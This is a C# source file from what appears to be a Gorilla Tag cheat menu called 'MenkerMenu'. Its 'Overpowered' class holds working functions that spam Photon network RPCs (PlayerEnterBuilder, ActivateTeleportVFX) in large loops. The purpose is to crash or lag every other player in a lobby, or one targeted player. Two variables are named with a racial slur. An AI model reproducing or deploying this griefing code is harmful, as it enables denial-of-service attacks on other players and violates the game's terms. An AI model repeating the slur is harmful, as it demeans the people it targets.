using System;
using System.Collections.Generic;
using System.Text;
using static MenkerMenu.Utilities.GunTemplate;
using static MenkerMenu.Utilities.ColorLib;
using static MenkerMenu.Utilities.Variables;
using static MenkerMenu.Utilities.HandOrbs;
using static MenkerMenu.Menu.Main;
using static MenkerMenu.Utilities.RigManager;
using static MenkerMenu.Mods.Categories.Settings;
using UnityEngine;
using UnityEngine.InputSystem;
using MenkerMenu.Utilities;
using UnityEngine.XR;
using UnityEngine.Animations.Rigging;
using UnityEngine.XR.Interaction.Toolkit;
using GorillaNetworking;
using MenkerMenu.Utilities.Patches;
using MenkerMenu.Menu;
using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using HarmonyLib;
using BepInEx;
using MenkerMenu.Utilities;
using GorillaTagScripts;
using System.Threading;

namespace MenkerMenu.Mods.Categories
{
    public class Overpowered
    {
        public static float crashall = 0;
        public static void InstaCrashAll()
        {
            for (int i = 0; i < 1000000; i++)
                if (Time.time > crashall)
                {
                    crashall = Time.time + 0.1f;
                    BuilderTableNetworking.instance.PlayerEnterBuilder();
                }
        }
        public static float lagalltimer = 0;
        public static void LagAll()
        {
            PhotonView nigger = GameObject.Find("Environment Objects/LocalObjects_Prefab/City_WorkingPrefab/Arcade_prefab/MainRoom/VRArea/ModIOArcadeTeleporter/NetObject_VRTeleporter").GetComponent<Photon.Pun.PhotonView>();
            if (Time.time > lagalltimer)
            {
                lagalltimer = Time.time + 0.1f;
                for (int i = 0; i < 250; i++)
                    nigger.RPC("ActivateTeleportVFX", RpcTarget.Others, new object[] { (short)UnityEngine.Random.Range(0, 7) });
            }
        }
        public static float lagtimer = 0;
        public static void LagGun()
        {
            GunTemplate.StartBothGuns(() =>
            {
                if (LockedPlayer && LockedPlayer != GorillaTagger.Instance.offlineVRRig)
                {
                    if (Time.time > lagtimer)
                    {
                        lagtimer = Time.time + 0.1f;
                        PhotonView nigger = GameObject.Find("Environment Objects/LocalObjects_Prefab/City_WorkingPrefab/Arcade_prefab/MainRoom/VRArea/ModIOArcadeTeleporter/NetObject_VRTeleporter").GetComponent<Photon.Pun.PhotonView>();
                        for (int i = 0; i < 250; i++)
                            nigger.RPC("ActivateTeleportVFX", NetPlayerToPlayer(GetPlayerFromVRRig(LockedPlayer)), new object[] { (short)UnityEngine.Random.Range(0, 7) });
                    }
                }
            }, true);
        }
        public static float guntimer = 0;
        public static void InstantsCrashGun()
        {
            GunTemplate.StartBothGuns(() =>
            {
                if (LockedPlayer && LockedPlayer != GorillaTagger.Instance.offlineVRRig)
                {
                    for (int i = 0; i < 1000000; i++)
                        BuilderTableNetworking.instance.PlayerEnterBuilderRPC(LockedPlayer.OwningNetPlayer.GetPlayerRef(), default(PhotonMessageInfo));
                }
            }, true);
        }
    }
}
